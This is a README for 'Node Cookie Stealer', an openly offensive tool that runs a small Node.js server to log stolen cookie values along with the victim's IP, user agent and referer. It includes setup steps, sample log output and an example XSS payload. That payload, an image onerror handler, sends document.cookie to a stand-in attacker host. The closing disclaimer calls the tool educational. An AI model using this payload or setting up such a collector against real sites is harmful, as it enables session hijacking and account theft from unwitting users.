# Node Cookie Stealer

## Usage
1. Clone Project
```
git clone https://github.com/TheWation/NodeCookieStealer
```

2. Install Node.js on your machine if you haven't already. You can download the latest version of Node.js from the official website: https://nodejs.org/en/download/

3. Create a new directory for your project and navigate into it using a terminal or command prompt.

4. Create a new file called app.js and copy the Node.js code into it.

5. Open a terminal or command prompt in the project directory and run the following command to install the required dependencies:

```bash
npm install express luxon
```
Run the following command to start the server:
```bash
node app.js
```
In your web browser, visit http://localhost:3000/c/your-cookie-value, replacing your-cookie-value with the value of the cookie that you want to log. For example, if the cookie value is ABC123, you would visit http://localhost:3000/c/ABC123.

The server will log the date and time, client IP address, user agent, referer, and cookie value to the cookies.txt file in the project directory.
```
[+] Date: 2022/10/03 15:30:45
[+] IP: 127.0.0.1
[+] UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36
[+] Referer: http://localhost:3000/
[+] Cookies: ABC123
---
```
The server will also return a response with a status code of 200 if the request was successful, or a status code of 500 if there was an error writing to the file.

You can repeat step 6 with different cookie values to log additional data to the file.

To stop the server, press CTRL+C in the terminal where it is running.

## Example Payload
```
https://pentest.target/?name=<img src=x onerror=this.src='http://evil-website.com/input.php?cookie='+document.cookie>
```

## Disclaimer
For educational purposes only. Do not use for illegal activities. Use at your own risk. By using this tool, you agree to comply with all applicable laws and regulations. Unauthorized use is strictly prohibited. Always obtain permission before using this tool. No warranties.

## License

`WebSecurityVision` is made with ♥  by [Wation](https://github.com/TheWation) and it's released under the MIT license.